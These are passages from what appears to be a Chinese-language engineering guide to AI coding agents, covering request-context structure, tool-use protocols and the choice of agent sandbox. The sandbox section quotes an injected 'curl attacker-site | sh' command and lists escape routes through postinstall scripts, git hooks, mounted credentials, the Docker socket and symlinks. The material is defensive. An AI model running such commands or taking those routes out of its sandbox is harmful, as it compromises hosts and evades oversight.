...
### 3.8 全景：一次请求的 context 里都有谁

把这一章的所有角色放进同一张图。左列是请求体的真实结构，右列标注每一段的来源和寿命：

```text
请求体
│
├── model / parallel_tool_calls              采样控制，模型看不到
│
├── instructions                  ── 稳定区，字节不变 ──
│    ├── 基础 prompt（角色、工作方式、红线）      人写，带版本号
│    ├── 项目规则（AGENTS.md / CLAUDE.md）       人写，随仓库版本走
│    ├── Memory 注入段（用户偏好、旧任务经验）    模型提炼，标注"线索性质"
│    └── Skill 目录（名字 + 一句话描述）          系统生成，几十个 Skill 只占几行
│
├── tools                         ── 稳定区，顺序固定 ──
│    └── function schema（名字、参数、用途）      人写，版本化
│
└── input                         ── 动态尾部，只追加 ──
     ├── compaction 摘要条目（可选）              80% 阈值触发时生成一次
     ├── environment（cwd、分支、沙箱）           运行时现场，每轮刷新
     ├── Skill 正文（命中的那本 SKILL.md）        按需注入，命中后常驻本轮
     ├── 早期 user / assistant / 工具往返         只追加，压缩后折进摘要
     └── 本轮 user / steering / tool result      每次变化
```

两个在 3.6、3.7 出现过、值得单独标位置的角色。Memory 落在 instructions 的尾段，紧跟项目规则之后：放头部是因为它服务整个会话，标注“线索性质”是因为它可能过期，且每次进请求的都是按当前任务筛过的那几条，不是全部记忆。Skills 是两级装载：目录（名字 + description）常驻 instructions 尾段，让模型知道有哪些本事；正文在任务命中后才注入 input，作为一条 user 侧的上下文消息常驻到任务结束。目录薄、正文厚，渐进式披露在请求结构上就是这个位置。

验收这张图的办法：抓任何一个成熟产品的请求包，把每个片段填进某一行。填不进去的设计要警惕，比如把 Memory 混进 assistant 消息（污染账本语义），把 environment 放进稳定区（打碎缓存前缀）。
...
让模型正确使用工具的“协议”其实是两层，混在一起容易搞错修复的位置。

<strong>第一层是格式协议，不用教</strong>。怎么产出合法的 `function_call`、参数怎么序列化、`call_id` 怎么配对，这是 API 契约，也是模型后训练时见过亿万次的格式。`tools` 数组一挂上去，模型就知道能调什么、参数长什么样。这层由 API 保证，格式错了请求直接被拒，位置很好排查。

<strong>第二层是使用协议，必须每份工具都教</strong>。模型不知道你的 `search_code` 搜的是什么范围、路径按什么口径、有没有副作用、失败了算什么意思。这些知识有三个载体：

| 载体 | 教什么 | 例子 |
|------|------|------|
| 工具 schema 的 description 和参数说明 | 每个工具自己的使用契约 | 4.1 那段：按正则搜索源码、排除 .git、文件名检索交给 file_glob、超上限标记 truncated |
| system prompt 里的整体使用政策 | 跨工具的行为规则 | 一轮可同时发起多个互不依赖的查询；接口失败标注受限，不要编造；一次拿足，避免同参数反复查 |
| 每次结果回传时附带的反馈 | 把教训写在结果消息里 | 限频拒绝时回“已达到调用上限……请在报告中标注该维度数据受限……不要编造未获取的数据” |

第三条最容易被忽略：协议不是一次性的说明书，是持续运行的对话。每次工具结果回到模型面前都是一次教学：数据带字段说明，失败带下一步建议，拒绝带收尾指引。模型配合不配合，一半取决于每轮结果消息写得好不好。

调试工具配合问题时，先分清是哪一层：格式层看 schema 是否合法，用法层看 description 和使用政策是否写全。
...
沙箱圈定的是三条边界：<strong>文件系统</strong>（workspace 可写，其余只读）、<strong>网络</strong>（默认断开，按域名放行）、<strong>资源</strong>（CPU、内存、进程数上限）。选型之前先回答威胁模型：要防的是模型偶尔犯蠢（误删文件、改错配置），还是要防被注入的指令蓄意使坏（`curl 攻击者站点 | sh`）？前者 OS 级沙箱够用，后者需要内核级隔离。四个档位：

| 档位 | 代表实现 | 开销 | 隔离强度 | 适用场景 |
|------|----------|------|----------|----------|
| OS 内嵌沙箱 | macOS Seatbelt / Linux Landlock + seccomp / bubblewrap | 近零 | 挡误伤，挡不住蓄意逃逸 | 本地交互开发的默认档 |
| 容器 | Docker / Podman + 只读 rootfs + 挂载 workspace | 秒级启动 | 资源限额 + 网络策略，较强 | 半无人值守、CI |
| 用户态内核 / 微虚拟机 | gVisor / Firecracker | 系统调用降速 10–30%，百毫秒级启动 | 内核级隔离 | 多租户、跑不可信来源的代码 |
| 托管沙箱服务 | E2B / Daytona / Fly Machines | 网络延迟 + 冷启动 | 取决于底层（多为容器或微虚拟机） | 不想自建、代码解释器类产品 |

现实中的参照：Codex CLI 在 macOS 用 Seatbelt、Linux 用 Landlock + seccomp，网络默认断开、经域名白名单代理放行；Claude Code 的 sandboxed Bash 是同思路的双平台实现（macOS SBPL、Linux bubblewrap）。CI 场景的最小做法是收紧 GitHub Actions 的权限范围再加容器。

落地时真正的坑不在正门在旁门：

- <strong>网络是最重要的决定</strong>。默认全断，要装依赖就走域名白名单代理（npm registry、PyPI），按域名审批；直接全开再靠人盯，等于没有网络策略。
- <strong>逃逸走的是供应链</strong>：npm 的 postinstall 脚本、git hooks、`curl | sh` 都会在“合法命令”里夹带任意代码。白名单代理管网络，安装脚本策略管包管理器。
- <strong>密钥不进沙箱</strong>。挂载进容器的 credentials 和 Docker socket 是经典事故——挂了 socket 约等于交出宿主机 root。
- <strong>workspace 可写也有讲究</strong>：符号链接可以把写路径引到 workspace 之外，沙箱配置要按解析后的真实路径判定。
- <strong>留一条范围内提权路线</strong>：沙箱挡住合法操作时，走“审批后临时开放某个域名/目录”，不是干脆关掉沙箱。一步到位地关，前面所有层就白搭了。

选型的判断入口就一句：交互开发有人盯着，L1 够用；要挂后台跑无人值守，至少 L2；代码来自不可信来源（外部 PR、爬来的仓库），L3 起步。沙箱和 4.4 的审批矩阵是互补的两面：审批回答“这次动作由谁授权”，沙箱回答“授权之后能碰到哪里”，无人值守时前者缺位，后者就是全部。
